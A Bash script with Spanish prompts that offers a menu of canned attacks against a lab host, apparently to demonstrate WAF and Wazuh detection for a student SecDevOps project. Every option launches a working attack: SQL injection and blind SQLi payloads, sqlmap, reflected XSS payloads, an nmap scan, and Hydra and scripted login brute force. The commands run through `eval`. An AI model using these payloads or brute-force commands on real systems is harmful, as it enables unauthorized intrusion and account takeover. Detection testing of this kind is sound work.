#!/bin/bash

VERDE='\033[0;32m'
AZUL='\033[1;34m'
ROJO='\033[0;31m'
NC='\033[0m'

IP_OBJETIVO="192.168.122.144"

mostrar_menu() {
    clear
    echo -e "${AZUL}====================================================${NC}"
    echo -e "${AZUL}    ARSENAL DE PRUEBAS - DEMOSTRACIÓN TFC SECDEVOPS  ${NC}"
    echo -e "${AZUL}====================================================${NC}"
    echo "1) SQLi - Ataque Simple (Tautología)"
    echo "2) SQLi - Ataque Avanzado (Blind SQLi con Sleep)"
    echo "3) SQLi - Herramienta Automatizada (Sqlmap)"
    echo "4) XSS  - Inyección de Etiqueta Script"
    echo "5) XSS  - Evasión con Atributo onerror"
    echo "6) Escáner - User-Agent de Nikto"
    echo "7) Reconocimiento - Escaneo de Puertos (Nmap)"
    echo "8) Fuerza Bruta - Hydra contra Login"
    echo "9) Fuerza Bruta - Script Personal (Anti-CSRF Bypass)"
    echo "0) Salir"
    echo -e "${AZUL}====================================================${NC}"
    echo -n "Selecciona un ataque para ejecutar: "
}

ejecutar_ataque() {
    echo -e "\n${VERDE}[+] Preparando:${NC} $1"
    echo -e "${VERDE}[+] Comando que se va a lanzar:${NC}\n    $2\n"
    
    read -p "Presiona [ENTER] para disparar el ataque..."
    
    echo -e "\n${ROJO}[!] Lanzando ataque...${NC}"
    eval $2

    echo -e "\n${VERDE}[✓] Ataque enviado.${NC}"
    echo -e "${AZUL}[i] Revisa ahora el Dashboard de Wazuh y los logs del WAF.${NC}"
    echo "----------------------------------------------------"
    read -p "Presiona [ENTER] para regresar al menú principal..."
}

while true; do
    mostrar_menu
    read opcion
    case $opcion in
        1)
            CMD="curl -i -s -X GET \"http://$IP_OBJETIVO/vulnerabilities/sqli/?id=1'%20OR%20'1'='1&Submit=Submit\" | head -n 15"
            ejecutar_ataque "Inyección SQL básica mediante parámetro GET" "$CMD"
            ;;
        2)
            CMD="curl -i -s -X GET \"http://$IP_OBJETIVO/vulnerabilities/sqli/?id=1'%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))A)/*&Submit=Submit\" | head -n 15"
            ejecutar_ataque "Blind SQLi intentando pausar la BD 5 segundos" "$CMD"
            ;;
        3)
            CMD="sqlmap -u \"http://$IP_OBJETIVO/index.php?id=1\" --batch --flush-session"
            ejecutar_ataque "Auditoría automatizada de inyección SQL con Sqlmap" "$CMD"
            ;;
        4)
            CMD="curl -i -s -X GET \"http://$IP_OBJETIVO/vulnerabilities/xss_r/?name=<script>alert(1)</script>\" | head -n 15"
            ejecutar_ataque "Cross-Site Scripting reflejado con etiqueta clásica" "$CMD"
            ;;
        5)
            CMD="curl -i -s -X GET \"http://$IP_OBJETIVO/vulnerabilities/xss_r/?name=<img%20src=x%20onerror=alert(String.fromCharCode(88,83,83))>\" | head -n 15"
            ejecutar_ataque "XSS avanzado evadiendo firmas con manejador de eventos" "$CMD"
            ;;
        6)
            CMD="curl -i -s -H \"User-Agent: Nikto\" \"http://$IP_OBJETIVO/index.php\" | head -n 15"
            ejecutar_ataque "Petición legítima modificando User-Agent (Simulación Nikto)" "$CMD"
            ;;
        7)  
            CMD="nmap $IP_OBJETIVO"
            ejecutar_ataque "Escáner de puertos y reconocimiento con Nmap" "$CMD"
            ;;
        8)  
            CMD="hydra -l admin -P diccionario.txt $IP_OBJETIVO http-post-form \"/login.php:user=^USER^&password=^PASS^&Login=Login:F=Login failed\""
            ejecutar_ataque "Fuerza bruta contra formulario web con Hydra" "$CMD"
            ;;
        9)
            CMD="./anti-csrf.py"
            ejecutar_ataque "Fuerza bruta contra formulario web con script personal" "$CMD"
            ;;
        0)
            echo "Saliendo del arsenal..."
            exit 0
            ;;
        *)
            echo "Opción no válida."
            sleep 1
            ;;
    esac
done
